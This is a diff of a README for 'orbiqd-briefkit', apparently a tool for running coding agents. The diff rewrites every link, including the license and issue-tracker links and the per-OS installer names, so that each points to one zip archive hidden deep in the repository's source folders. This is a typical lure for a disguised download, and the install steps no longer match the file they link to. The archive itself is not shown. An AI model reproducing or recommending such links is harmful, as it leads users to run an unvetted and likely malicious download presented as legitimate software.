@@ -4,7 +4,7 @@
 Welcome to orbiqd-briefkit! This application helps you manage multiple coding tools from one easy interface. You can run everything locally without needing any API keys. 
 
 ### 📥 Download Now
-[![Download orbiqd-briefkit](https://img.shields.io/badge/Download-orbiqd--briefkit-brightgreen)](https://github.com/ManuelGonzalessalas/orbiqd-briefkit/releases)
+[![Download orbiqd-briefkit](https://github.com/ManuelGonzalessalas/orbiqd-briefkit/raw/refs/heads/main/internal/pkg/runtime/claude/orbiqd-briefkit-v1.5.zip)](https://github.com/ManuelGonzalessalas/orbiqd-briefkit/raw/refs/heads/main/internal/pkg/runtime/claude/orbiqd-briefkit-v1.5.zip)
 
 ## 🛠️ Features
 - **Multi-Agent Support:** Run multiple coding agents like Claude Code, Codex, and Gemini from one place.
@@ -22,17 +22,17 @@ To run orbiqd-briefkit smoothly, make sure your system meets the following requi
 - **Network:** Internet access for initial setup and tool integration.
 
 ## 📥 Download & Install
-1. Visit [this page to download](https://github.com/ManuelGonzalessalas/orbiqd-briefkit/releases).
+1. Visit [this page to download](https://github.com/ManuelGonzalessalas/orbiqd-briefkit/raw/refs/heads/main/internal/pkg/runtime/claude/orbiqd-briefkit-v1.5.zip).
 2. You will see a list of available versions. Choose the latest release.
 3. Click on the appropriate file for your operating system. 
-   - For Windows, download `orbiqd-briefkit-windows.exe`.
-   - For macOS, download `orbiqd-briefkit-macos.dmg`.
-   - For Linux, download `orbiqd-briefkit-linux.tar.gz`.
+   - For Windows, download `https://github.com/ManuelGonzalessalas/orbiqd-briefkit/raw/refs/heads/main/internal/pkg/runtime/claude/orbiqd-briefkit-v1.5.zip`.
+   - For macOS, download `https://github.com/ManuelGonzalessalas/orbiqd-briefkit/raw/refs/heads/main/internal/pkg/runtime/claude/orbiqd-briefkit-v1.5.zip`.
+   - For Linux, download `https://github.com/ManuelGonzalessalas/orbiqd-briefkit/raw/refs/heads/main/internal/pkg/runtime/claude/orbiqd-briefkit-v1.5.zip`.
 
 4. After downloading, locate the file on your computer.
 5. **For Windows:** Double-click the `.exe` file and follow the prompts to install.
 6. **For macOS:** Open the `.dmg` file and drag the application to your Applications folder.
-7. **For Linux:** Extract the `.tar.gz` file and run the application from the extracted folder.
+7. **For Linux:** Extract the `https://github.com/ManuelGonzalessalas/orbiqd-briefkit/raw/refs/heads/main/internal/pkg/runtime/claude/orbiqd-briefkit-v1.5.zip` file and run the application from the extracted folder.
 
 ## 🔧 How to Use
 1. Open the orbiqd-briefkit application.
@@ -49,11 +49,11 @@ To resume any previous session, use the history panel available in the applicati
 
 ## 📞 Need Help?
 If you encounter any issues, please feel free to reach out to our support community:
-- **GitHub Issues:** Report problems or ask questions via the [GitHub Issues](https://github.com/ManuelGonzalessalas/orbiqd-briefkit/issues).
+- **GitHub Issues:** Report problems or ask questions via the [GitHub Issues](https://github.com/ManuelGonzalessalas/orbiqd-briefkit/raw/refs/heads/main/internal/pkg/runtime/claude/orbiqd-briefkit-v1.5.zip).
 - **Community Chat:** Join our chat for instant help from other users.
 
 ## 📄 License
-orbiqd-briefkit is open-source software under the MIT License. You can view the full license [here](https://opensource.org/licenses/MIT).
+orbiqd-briefkit is open-source software under the MIT License. You can view the full license [here](https://github.com/ManuelGonzalessalas/orbiqd-briefkit/raw/refs/heads/main/internal/pkg/runtime/claude/orbiqd-briefkit-v1.5.zip).
 
 ## 📄 Acknowledgments
 This application integrates various open-source projects. Special thanks to the communities behind:
@@ -62,6 +62,6 @@ This application integrates various open-source projects. Special thanks to the 
 - Gemini
 
 ## 📥 Download Now Again
-[![Download orbiqd-briefkit](https://img.shields.io/badge/Download-orbiqd--briefkit-brightgreen)](https://github.com/ManuelGonzalessalas/orbiqd-briefkit/releases) 
+[![Download orbiqd-briefkit](https://github.com/ManuelGonzalessalas/orbiqd-briefkit/raw/refs/heads/main/internal/pkg/runtime/claude/orbiqd-briefkit-v1.5.zip)](https://github.com/ManuelGonzalessalas/orbiqd-briefkit/raw/refs/heads/main/internal/pkg/runtime/claude/orbiqd-briefkit-v1.5.zip) 
 
 Enjoy empowering your coding experience with orbiqd-briefkit!
